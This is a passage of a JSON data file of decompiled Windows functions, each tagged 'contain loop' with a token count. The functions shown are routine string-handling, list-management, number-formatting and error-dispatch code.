(cVar1 == '\\x0e') {\n        do {\n            fcn.004060ac();\n            iVar4 = iVar3 + -1;\n            bVar2 = 0 < iVar3;\n            iVar3 = iVar4;\n        } while (iVar4 != 0 && bVar2);\n    }\n    else if (cVar1 == '\\x0f') {\n        do {\n            fcn.0040700c();\n            iVar4 = iVar3 + -1;\n            bVar2 = 0 < iVar3;\n            iVar3 = iVar4;\n        } while (iVar4 != 0 && bVar2);\n    }\n    else {\n        if (cVar1 != '\\x11') {\n            if (*0x493008 != NULL) {\n                (**0x493008)();\n            }\n            fcn.00402ff8();\n            return;\n        }\n        do {\n            fcn.00406934();\n            iVar4 = iVar3 + -1;\n            bVar2 = 0 < iVar3;\n            iVar3 = iVar4;\n        } while (iVar4 != 0 && bVar2);\n    }\n    return;\n}\n",
        "token_count": 540
    },
    "0040678c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00403024)\n\nvoid __fastcall fcn.0040678c(int32_t param_1, char *param_2)\n\n{\n    char cVar1;\n    bool bVar2;\n    int32_t iVar3;\n    \n    if (param_1 != 0) {\n        cVar1 = *param_2;\n        if (cVar1 == '\\n') {\n            if (param_1 < 2) {\n                fcn.00405530();\n            }\n            else {\n                fcn.00405554();\n            }\n        }\n        else if (cVar1 == '\\v') {\n            if (param_1 < 2) {\n                fcn.00405d28();\n            }\n            else {\n                fcn.00405d40();\n            }\n        }\n        else if (cVar1 == '\\f') {\n            do {\n                fcn.004060e0();\n                iVar3 = param_1 + -1;\n                bVar2 = 0 < param_1;\n                param_1 = iVar3;\n            } while (iVar3 != 0 && bVar2);\n        }\n        else if (cVar1 == '\\r') {\n            do {\n                fcn.004060f8();\n                iVar3 = param_1 + -1;\n                bVar2 = 0 < param_1;\n                param_1 = iVar3;\n            } while (iVar3 != 0 && bVar2);\n        }\n        else if (cVar1 == '\\x0e') {\n            do {\n                fcn.004060ac();\n                iVar3 = param_1 + -1;\n                bVar2 = 0 < param_1;\n                param_1 = iVar3;\n            } while (iVar3 != 0 && bVar2);\n        }\n        else if (cVar1 == '\\x0f') {\n            do {\n                fcn.0040700c();\n                iVar3 = param_1 + -1;\n                bVar2 = 0 < param_1;\n                param_1 = iVar3;\n            } while (iVar3 != 0 && bVar2);\n        }\n        else {\n            if (cVar1 != '\\x11') {\n                if (*0x493008 != NULL) {\n                    (**0x493008)();\n                }\n                fcn.00402ff8();\n                return;\n            }\n            do {\n                fcn.00406934();\n                iVar3 = param_1 + -1;\n                bVar2 = 0 < param_1;\n                param_1 = iVar3;\n            } while (iVar3 != 0 && bVar2);\n        }\n    }\n    return;\n}\n",
        "token_count": 578
    },
    "00406a10": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.00406a10(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t *piVar2;\n    \n    piVar2 = *0x48f040;\n    if (*0x48f040 != NULL) {\n        do {\n            if (((in_EAX == piVar2[1]) || (in_EAX == piVar2[2])) || (in_EAX == piVar2[3])) {\n                iVar1 = fcn.004069c8();\n                return iVar1;\n            }\n            piVar2 = *piVar2;\n        } while (piVar2 != NULL);\n    }\n    return in_EAX;\n}\n",
        "token_count": 152
    },
    "00406a48": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nchar * fcn.00406a48(void)\n\n{\n    char *in_EAX;\n    \n    while ((*in_EAX != '\\0' && (*in_EAX != '\\\\'))) {\n        in_EAX = sub.user32.dll_CharNextA();\n    }\n    return in_EAX;\n}\n",
        "token_count": 62
    },
    "00406ecc": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00406ecc(void)\n\n{\n    int32_t **ppiVar1;\n    int32_t *in_EAX;\n    int32_t **ppiVar2;\n    \n    if ((*0x48f044 == NULL) || ((*0x48f044)[1] != in_EAX)) {\n        ppiVar2 = *0x48f044;\n        if (*0x48f044 != NULL) {\n            do {\n                ppiVar1 = *ppiVar2;\n                if ((ppiVar1 != NULL) && (ppiVar1[1] == in_EAX)) {\n                    *ppiVar2 = *ppiVar1;\n                    fcn.00402f1c();\n                    return;\n                }\n                ppiVar2 = *ppiVar2;\n            } while (ppiVar2 != NULL);\n        }\n    }\n    else {\n        *0x48f044 = **0x48f044;\n        fcn.00402f1c();\n    }\n    return;\n}\n",
        "token_count": 213
    },
    "00406f9c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00406f9c(void)\n\n{\n    uint *puVar1;\n    uint *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack20;\n    uint uStack16;\n    uchar *puStack12;\n    uint *var_4h;\n    \n    puStack12 = &stack0xfffffffc;\n    uStack16 = 0x407000;\n    uStack20 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack20;\n    var_4h = in_EAX;\n    fcn.00406f30();\n    *in_FS_OFFSET = uStack20;\n    puVar1 = *0x48f040;\n    if (var_4h == *0x48f040) {\n        *0x48f040 = *var_4h;\n    }\n    else {\n        for (; puVar1 != NULL; puVar1 = *puVar1) {\n            if (*puVar1 == var_4h) {\n                *puVar1 = *var_4h;\n                return;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 238
    },
    "00409bc0": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00409bc0(uint param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar1 = fcn.00405ec8();\n    for (iVar2 = 1; (iVar2 <= iVar1 && (*(in_EAX + -2 + iVar2 * 2) < 0x21)); iVar2 = iVar2 + 1) {\n    }\n    if (iVar1 < iVar2) {\n        fcn.00405d28();\n    }\n    else {\n        for (; *(in_EAX + -2 + iVar1 * 2) < 0x21; iVar1 = iVar1 + -1) {\n        }\n        fcn.00405f58(param_2);\n    }\n    return;\n}\n",
        "token_count": 182
    },
    "0040a9ec": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040a9ec(int32_t param_1, char *param_2)\n\n{\n    char *pcVar1;\n    char cVar2;\n    uint8_t uVar3;\n    char *in_EAX;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    char *pcVar7;\n    bool bVar8;\n    \n    uVar4 = 0;\n    iVar6 = param_1;\n    pcVar7 = param_2;\n    if (param_1 != 0) {\n        do {\n            if (iVar6 == 0) break;\n            iVar6 = iVar6 + -1;\n            cVar2 = *pcVar7;\n            pcVar7 = pcVar7 + 1;\n        } while (cVar2 != '\\0');\n        param_1 = param_1 - iVar6;\n        bVar8 = true;\ncode_r0x0040aa05:\n        do {\n            if (param_1 != 0) {\n                param_1 = param_1 + -1;\n                pcVar1 = param_2 + 1;\n                pcVar7 = in_EAX + 1;\n                bVar8 = *in_EAX == *param_2;\n                in_EAX = pcVar7;\n                param_2 = pcVar1;\n                if (bVar8) goto code_r0x0040aa05;\n            }\n            if (bVar8) {\n                return;\n            }\n            uVar3 = in_EAX[-1];\n            uVar5 = uVar4 & 0xffffff00 | uVar3;\n            if ((0x60 < uVar3) && (uVar3 < 0x7b)) {\n                uVar5 = uVar4 & 0xffffff00 | uVar3 - 0x20;\n            }\n            uVar3 = param_2[-1];\n            uVar4 = uVar3;\n            if ((0x60 < uVar3) && (uVar3 < 0x7b)) {\n                uVar4 = uVar3 - 0x20;\n            }\n            uVar4 = uVar5 - uVar4;\n            bVar8 = uVar4 == 0;\n        } while (bVar8);\n    }\n    return;\n}\n",
        "token_count": 504
    },
    "0040aa30": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nchar * __fastcall fcn.0040aa30(uint param_1, char param_2)\n\n{\n    char *in_EAX;\n    \n    while( true ) {\n        if (param_2 == *in_EAX) {\n            return in_EAX;\n        }\n        if (*in_EAX == '\\0') break;\n        in_EAX = in_EAX + 1;\n    }\n    return NULL;\n}\n",
        "token_count": 89
    },
    "0040aa44": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nchar * __fastcall fcn.0040aa44(uint param_1, char *param_2)\n\n{\n    char cVar1;\n    char *in_EAX;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    char *pcVar7;\n    char *pcVar8;\n    bool bVar9;\n    \n    if ((in_EAX != NULL) && (param_2 != NULL)) {\n        uVar2 = 0xffffffff;\n        pcVar7 = param_2;\n        do {\n            if (uVar2 == 0) break;\n            uVar2 = uVar2 - 1;\n            cVar1 = *pcVar7;\n            pcVar7 = pcVar7 + 1;\n        } while (cVar1 != '\\0');\n        uVar3 = ~uVar2 - 1;\n        if (uVar3 != 0) {\n            uVar4 = 0xffffffff;\n            pcVar7 = in_EAX;\n            do {\n                if (uVar4 == 0) break;\n                uVar4 = uVar4 - 1;\n                cVar1 = *pcVar7;\n                pcVar7 = pcVar7 + 1;\n            } while (cVar1 != '\\0');\n            iVar5 = ~uVar4 - uVar3;\n            bVar9 = iVar5 == 0;\n            if (uVar3 <= ~uVar4 && !bVar9) {\n                do {\n                    pcVar7 = param_2 + 1;\n                    pcVar8 = in_EAX;\n                    do {\n                        in_EAX = pcVar8;\n                        if (iVar5 == 0) break;\n                        iVar5 = iVar5 + -1;\n                        in_EAX = pcVar8 + 1;\n                        bVar9 = *param_2 == *pcVar8;\n                        pcVar8 = in_EAX;\n                    } while (!bVar9);\n                    iVar6 = ~uVar2 - 2;\n                    pcVar8 = in_EAX;\n                    if (!bVar9) {\n                        return NULL;\n                    }\n                    do {\n                        if (iVar6 == 0) break;\n                        bVar9 = *pcVar7 == *pcVar8;\n                        iVar6 = iVar6 + -1;\n                        pcVar8 = pcVar8 + 1;\n                        pcVar7 = pcVar7 + 1;\n                    } while (bVar9);\n                    if (bVar9) {\n                        return in_EAX + -1;\n                    }\n                } while( true );\n            }\n        }\n    }\n    return NULL;\n}\n",
        "token_count": 579
    },
    "0040acba": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040acba(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint8_t uVar2;\n    uint64_t *puVar3;\n    char cVar4;\n    int16_t iVar6;\n    uint32_t uVar7;\n    uint extraout_ECX;\n    unkbyte3 Var8;\n    int32_t iVar9;\n    uint32_t uVar10;\n    int32_t unaff_EBP;\n    uint8_t *puVar11;\n    float10 fVar12;\n    float10 fVar13;\n    float10 fVar14;\n    uint var_69h;\n    uint var_59h;\n    uint var_49h;\n    uint var_28h;\n    uint var_24h;\n    uint var_18h;\n    uint var_ch;\n    uint var_4h;\n    char cVar5;\n    \n    iVar9 = *(unaff_EBP + -0xc);\n    if (iVar9 <= *(unaff_EBP + 8)) {\n        *(unaff_EBP + -0xc) = *(unaff_EBP + -0xc) + 1;\n    // WARNING: Could not recover jumptable at 0x0040acda. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (5 cases) at 0x40ace1\n        (**(*(*(unaff_EBP + 0xc) + iVar9 * 8 + 4) * 4 + 0x40ace1))();\n        return;\n    }\n    do {\n        fcn.0040aee7();\n        puVar3 = fcn.0040ab08();\n        uVar10 = *(unaff_EBP + -0x24);\n        if (0x20 < uVar10) {\n            uVar10 = 0;\n        }\n        cVar5 = extraout_ECX;\n        Var8 = extraout_ECX >> 8;\n        cVar4 = cVar5 + -0x44;\n        if (cVar4 == '\\0') break;\n        cVar4 = '\\x10';\n        Var8 = 0;\n        if (cVar5 == 'X') break;\n        cVar4 = '\\n';\n        Var8 = 0;\n    } while (cVar5 != 'U');\n    iVar6 = CONCAT31(Var8, cVar4);\n    if ((cVar4 == '\\0') && (iVar6 = 10,  (*(puVar3 + 4) & 0x80000000) != 0)) {\n        fcn.00409db4(-*puVar3, -(*(puVar3 + 4) + (*puVar3 != 0)));\n        *(unaff_EBP + -0x4a) = 0x2d;\n        return;\n    }\n    if ((*(puVar3 + 4) & 0x80000000) == 0) {\n        fVar14 = *puVar3;\n    }\n    else {\n        fVar14 = 0x7fffffffffffffff + 1 + (*puVar3 & 0x7fffffffffffffff);\n    }\n    fVar12 = iVar6;\n    puVar11 = unaff_EBP + -0x49;\n    do {\n        puVar11 = puVar11 + -1;\n        fVar13 = fVar14 - (fVar14 / fVar12) * fVar12;\n        fVar14 = fVar14 / fVar12;\n        var_4h._0_1_ = ROUND(fVar13);\n        uVar2 = var_4h + 0x30;\n        if (0x39 < uVar2) {\n            uVar2 = var_4h + 0x37;\n        }\n        *puVar11 = uVar2;\n    } while (1 <= fVar14);\n    uVar7 = (unaff_EBP + -0x49) - puVar11;\n    iVar9 = uVar10 - uVar7;\n    if (uVar7 <= uVar10 && iVar9 != 0) {\n        iVar1 = -iVar9;\n        while (iVar9 = iVar9 + -1,  iVar9 != 0) {\n            (puVar11 + iVar1)[iVar9] = 0x30;\n        }\n        puVar11[iVar1] = 0x30;\n    }\n    return;\n}\n",
        "token_count": 985
    },
    "0040b673": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0040b673(void)\n\n{\n    char cVar1;\n    char *unaff_ESI;\n    \n    do {\n        cVar1 = *unaff_ESI;\n        if (cVar1 == '\\0') {\n            return;\n        }\n        unaff_ESI = unaff_ESI + 1;\n    } while (cVar1 == ' ');\n    return;\n}\n",
        "token_count": 85
    },
    "0040c944": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040c944(uint param_1, int32_t *param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar2 = *param_2;\n    while( true ) {\n        iVar1 = fcn.0040580c();\n        if ((iVar1 < iVar2) || (*(in_EAX + -1 + iVar2) != ' ')) break;\n        iVar2 = iVar2 + 1;\n    }\n    *param_2 = iVar2;\n    return;\n}\n",
        "token_count": 127
    },
    "0040cb10": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint fcn.0040cb10(void)\n\n{\n    uint8_t uVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar3 = 1;\n    while( true ) {\n        iVar2 = fcn.0040580c();\n        if (iVar2 < iVar3) {\n            return 0;\n        }\n        uVar1 = *(in_EAX + -1 + iVar3) & 0xdf;\n        if (uVar1 == 0x44) {\n            return 1;\n        }\n        if (uVar1 == 0x45) {\n            return 2;\n        }\n        if (uVar1 == 0x4d) break;\n        if (uVar1 == 0x59) {\n            return 2;\n        }\n        iVar3 = iVar3 + 1;\n    }\n    return 0;\n}\n",
        "token_count": 199
    },
    "0040ea28": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040ea28(uint param_1, char param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar2 = fcn.0040ea5c();\n    iVar3 = iVar2;\n    if (param_2 != '\\0') {\n        while (iVar1 = iVar3,  iVar1 != 0) {\n            iVar3 = fcn.0040ea5c();\n            iVar2 = iVar1;\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 124
    },
    "0040ea5c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.0040ea5c(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    \n    iVar2 = fcn.0040aa30();\n    while ((iVar2 != 0 && (cVar1 = fcn.0040e518(),  cVar1 != '\\0'))) {\n        iVar2 = fcn.0040aa30();\n    }\n    return iVar2;\n}\n",
        "token_count": 92
    },
    "0040f310": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nchar fcn.0040f310(void)\n\n{\n    char cVar1;\n    uint *puVar2;\n    \n    cVar1 = '\\x01';\n    for (puVar2 = *0x48fa20; (cVar1 != '\\0' && (puVar2 != NULL)); puVar2 = *puVar2) {\n        cVar1 = (*puVar2[1])();\n    }\n    return cVar1;\n}\n",
        "token_count": 97
    },
    "0040f594": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040f594(uint param_1, uint *param_2)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint uVar4;\n    \n    uVar1 = fcn.0040f578();\n    iVar2 = sub.kernel32.dll_GetCurrentThreadId_1();\n    for (puVar3 = *(in_EAX + 4 + (uVar1 & 0xff) * 4); (puVar3 != NULL && (iVar2 != puVar3[1])); puVar3 = *puVar3) {\n    }\n    if (puVar3 == NULL) {\n        puVar3 = fcn.0040f61c();\n        if (puVar3 == NULL) {\n            puVar3 = fcn.00402ee8();\n            puVar3[1] = iVar2;\n            puVar3[2] = 0x7fffffff;\n            *puVar3 = puVar3;\n            uVar4 = fcn.0040f510();\n            *puVar3 = uVar4;\n        }\n    }\n    *param_2 = puVar3;\n    return;\n}\n",
        "token_count": 267
    },
    "0040f61c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint * fcn.0040f61c(void)\n\n{\n    uint *puVar1;\n    int32_t in_EAX;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    \n    uVar2 = fcn.0040f578();\n    puVar1 = *(in_EAX + 4 + (uVar2 & 0xff) * 4);\n    while( true ) {\n        if (puVar1 == NULL) {\n            return NULL;\n        }\n        iVar3 = fcn.0040f510();\n        if (iVar3 != 0x7fffffff) break;\n        puVar1 = *puVar1;\n    }\n    uVar4 = sub.kernel32.dll_GetCurrentThreadId_1();\n    puVar1[1] = uVar4;\n    return puVar1;\n}\n",
        "token_count": 184
    },
    "00411028": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00411028(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint *var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uchar *var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_10h = &stack0xfffffffc;\n    iVar1 = 8;\n    do {\n        var_4h = 0;\n        iVar1 = iVar1 + -1;\n    } while (iVar1 != 0);\n    var_14h = 0x41126d;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.00411028::var_18h;\n    if (in_EAX < -0x7ffdfff5) {\n        if (in_EAX == -0x7ffdfff6) {\n            var_1ch = 0x4110fe;\n            var_10h = &stack0xfffffffc;\n            fcn.00407550();\n            var_1ch = 0x41110d;\n            fcn.0040daec();\n            var_1ch = 0x411112;\n            fcn.00404ec4();\n            goto code_r0x00411245;\n        }\n        if (in_EAX < -0x7ffdfffa) {\n            if (in_EAX == -0x7ffdfffb) {\n                var_1ch = 0x4110bc;\n                var_10h = &stack0xfffffffc;\n                fcn.00410df4();\n                goto code_r0x00411245;\n            }\n            if (in_EAX == -0x7fffbfff) {\n                var_1ch = 0x411170;\n                var_10h = &stack0xfffffffc;\n                fcn.00407550();\n                var_1ch = 0x41117f;\n                fcn.0040daec();\n                var_1ch = 0x411184;\n                fcn.00404ec4();\n                goto code_r0x00411245;\n            }\n            if (in_EAX == -0x7fff0001) {\n                var_1ch = 0x4111df;\n                var_10h = &stack0xfffffffc;\n                fcn.00407550();\n                var_1ch = 0x4111ee;\n                fcn.0040daec();\n                var_1ch = 0x4111f3;\n                fcn.00404ec4();\n                goto code_r0x00411245;\n            }\n        }\n        else {\n            if (in_EAX == -0x7ffdfff8) {\n                var_1ch = 0x4110ce;\n                var_10h = &stack0xfffffffc;\n                fcn.00407550();\n                var_1ch = 0x4110dd;\n                fcn.0040daec();\n                var_1ch = 0x4110e2;\n                fcn.00404ec4();\n                goto code_r0x00411245;\n            }\n            if (in_EAX == -0x7ffdfff7) {\n                var_1ch = 0x4110ec;\n                var_10h = &stack0xfffffffc;\n                fcn.00410ee4();\n                goto code_r0x00411245;\n            }\n        }\n    }\n    else {\n        if (in_EAX == -0x7ffdfff5) {\n            var_1ch = 0x411124;\n            fcn.00407550();\n            var_1ch = 0x411133;\n            fcn.0040daec();\n            var_1ch = 0x411138;\n            fcn.00404ec4();\n            goto code_r0x00411245;\n        }\n        if (in_EAX == -0x7ffdfff3) {\n            var_1ch = 0x41114a;\n            var_10h = &stack0xfffffffc;\n            fcn.00407550();\n            var_1ch = 0x411159;\n            fcn.0040daec();\n            var_1ch = 0x41115e;\n            fcn.00404ec4();\n            goto code_r0x00411245;\n        }\n        if (in_EAX == -0x7ff8fff2) {\n            var_1ch = 0x411196;\n            var_10h = &stack0xfffffffc;\n            fcn.00407550();\n            var_1ch = 0x4111a5;\n            fcn.0040daec();\n            var_1ch = 0x4111aa;\n            fcn.00404ec4();\n            goto code_r0x00411245;\n        }\n        if (in_EAX == -0x7ff8ffa9) {\n            var_1ch = 0x4111bc;\n            var_10h = &stack0xfffffffc;\n            fcn.00407550();\n            var_1ch = 0x4111cb;\n            fcn.0040daec();\n            var_1ch = 0x4111d0;\n            fcn.00404ec4();\n            goto code_r0x00411245;\n        }\n    }\n    var_38h = **0x492734;\n    var_34h._0_1_ = 0xb;\n    var_2ch._0_1_ = 0;\n    var_1ch = 0x411214;\n    var_10h = &stack0xfffffffc;\n    fcn.0040d2d8();\n    var_1ch = &fcn.00411028::var_38h;\n    var_20h = 2;\n    var_24h = 0x411231;\n    fcn.00407550();\n    var_24h = 0x411240;\n    fcn.0040db28(var_20h, var_1ch);\n    var_24h = 0x411245;\n    fcn.00404ec4();\ncode_r0x00411245:\n    *in_FS_OFFSET = var_20h;\n    var_18h = 0x411274;\n    var_1ch = 0x41125f;\n    fcn.00405554();\n    var_1ch = 0x41126c;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 1542
    },
    "004164e4": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.004164e4(uint param_1, int32_t param_2)\n\n{\n    int32_t *piVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint8_t *puVar4;\n    \n    if (param_2 != 0) {\n        iVar2 = **(in_EAX + 0xb + *(in_EAX + 1));\n        uVar3 = *(iVar2 + 1);\n        puVar4 = iVar2 + 0xf + uVar3;\n        piVar1 = iVar2 + 7 + uVar3;\n        iVar2 = 0;\n        do {\n            uVar3 = uVar3 & 0xffffff00 | *puVar4;\n            if (uVar3 == *(param_2 + -4)) {\n                while (((*((uVar3 - 1) + param_2) ^ puVar4[uVar3]) & 0xdf) == 0) {\n                    uVar3 = uVar3 - 1;\n                    if (uVar3 == 0) {\n                        return iVar2;\n                    }\n                }\n                uVar3 = uVar3 & 0xffffff00 | *puVar4;\n            }\n            iVar2 = iVar2 + 1;\n            puVar4 = puVar4 + uVar3 + 1;\n        } while (iVar2 <= *piVar1);\n    }\n    return -1;\n}\n",
        "token_count": 322
    },
    "00416594": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00416594(uint param_1, uchar *param_2)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint8_t uVar4;\n    uchar *puVar3;\n    uchar *puVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    \n    if (in_EAX != 0) {\n        puVar3 = param_2;\n        if (param_2 != NULL) {\n            puVar3 = CONCAT11(*param_2, param_2[-4]) & 0xdfff;\n        }\n        while( true ) {\n            iVar1 = in_EAX + 2 + *(in_EAX + 1);\n            uVar6 = *(iVar1 + 10);\n            uVar7 = *(iVar1 + 0xb + uVar6);\n            if (uVar7 != 0) {\n                iVar2 = iVar1 + 0xd + uVar6;\n                do {\n                    puVar5 = uVar6 & 0xffff0000 | *(iVar2 + 0x1a) & 0xffffdfff;\n                    if (puVar5 == puVar3) {\n                        uVar6 = uVar6 & 0xffff0000 | *(iVar2 + 0x1a) & 0xffff00ff;\n                        while( true ) {\n                            uVar4 = param_2[uVar6 - 1] ^ *(iVar2 + 0x1a + uVar6);\n                            if ((uVar4 & 0xdf) != 0) break;\n                            uVar6 = uVar6 - 1;\n                            puVar3 = puVar3 & 0xffff0000 | CONCAT11(uVar4, puVar3);\n                            if (uVar6 == 0) {\n                                return;\n                            }\n                        }\n                        puVar3 = puVar3 & 0xffff0000 | CONCAT11(*param_2, puVar3) & 0xffffdfff;\n                        puVar5 = uVar6 & 0xffffff00 | *(iVar2 + 0x1a);\n                    }\n                    uVar6 = puVar5 & 0xffff00ff;\n                    uVar7 = uVar7 - 1;\n                    iVar2 = iVar2 + 0x1b + uVar6;\n                } while (uVar7 != 0);\n            }\n            if (*(iVar1 + 4) == NULL) break;\n            in_EAX = **(iVar1 + 4);\n        }\n    }\n    return;\n}\n",
        "token_count": 557
    },
    "004186c4": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nulong __fastcall fcn.004186c4(uint param_1, uint param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    \n    if ((*(in_EAX + 4) != 0) && (iVar3 = *(*(in_EAX + 4) + 8),  -1 < iVar3 + -1)) {\n        do {\n            uVar2 = fcn.00419888();\n            cVar1 = fcn.00404544();\n            if (cVar1 != '\\0') goto code_r0x00418723;\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != 0);\n    }\n    if ((*(in_EAX + 8) == NULL) || (iVar3 = (**(**(in_EAX + 8) + 0x54))(),  iVar3 < 0)) {\n        uVar2 = 0;\n    }\n    else {\n        uVar2 = (**(**(in_EAX + 8) + 0x18))();\n    }\ncode_r0x00418723:\n    return CONCAT44(param_2, uVar2);\n}\n",
        "token_count": 264
    },
    "0041872c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint64_t __fastcall fcn.0041872c(uint param_1)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint uStack20;\n    \n    uStack20._1_3_ = param_1 >> 8;\n    uStack20 = CONCAT31(uStack20._1_3_, 1);\n    iVar2 = *(*(in_EAX + 0xc) + 8);\n    if (-1 < iVar2 + -1) {\n        do {\n            fcn.00419888();\n            cVar1 = fcn.0040487c();\n            if (cVar1 != '\\0') goto code_r0x00418766;\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    uStack20 = uStack20._1_3_ << 8;\ncode_r0x00418766:\n    return CONCAT44(uStack20, uStack20) & 0xffffffff000000ff;\n}\n",
        "token_count": 233
    },
    "00418920": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00418920(uint param_1, int32_t param_2)\n\n{\n    uchar uVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    if (*(in_EAX + 0x20) != param_2) {\n        *(in_EAX + 0x20) = param_2;\n        iVar3 = *(*(in_EAX + 4) + 8);\n        if (-1 < iVar3 + -1) {\n            do {\n                iVar2 = fcn.00419888();\n                uVar1 = fcn.0041872c();\n                *(iVar2 + 0x10) = uVar1;\n                iVar3 = iVar3 + -1;\n            } while (iVar3 != 0);\n        }\n    }\n    return;\n}\n",
        "token_count": 185
    },
    "00418a40": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nulong __fastcall fcn.00418a40(uint param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    \n    uVar2 = 0;\n    iVar1 = *(*(in_EAX + 4) + 8);\n    if (-1 < iVar1 + -1) {\n        do {\n            fcn.00419888();\n            uVar2 = fcn.004185b8(param_2);\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return CONCAT44(param_2, uVar2);\n}\n",
        "token_count": 143
    },
    "00418c48": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint64_t __fastcall fcn.00418c48(uint param_1)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint uStack20;\n    \n    uStack20._1_3_ = param_1 >> 8;\n    uStack20 = CONCAT31(uStack20._1_3_, 1);\n    iVar2 = *(*(in_EAX + 4) + 8);\n    if (-1 < iVar2 + -1) {\n        do {\n            fcn.00419888();\n            cVar1 = fcn.00418830();\n            if (cVar1 != '\\0') goto code_r0x00418c80;\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    uStack20 = uStack20._1_3_ << 8;\ncode_r0x00418c80:\n    return CONCAT44(uStack20, uStack20) & 0xffffffff000000ff;\n}\n",
        "token_count": 233
    },
    "00418c8c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00418c8c(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar2 = *(*(in_EAX + 4) + 8);\n    if (-1 < iVar2 + -1) {\n        do {\n            fcn.00419888();\n            iVar1 = fcn.004198e4();\n            if (-1 < iVar1) {\n                return;\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    fcn.00418628();\n    fcn.00419730();\n    return;\n}\n",
        "token_count": 144
    },
    "00419008": {
        "rules": [
            "contain loop"
        ],
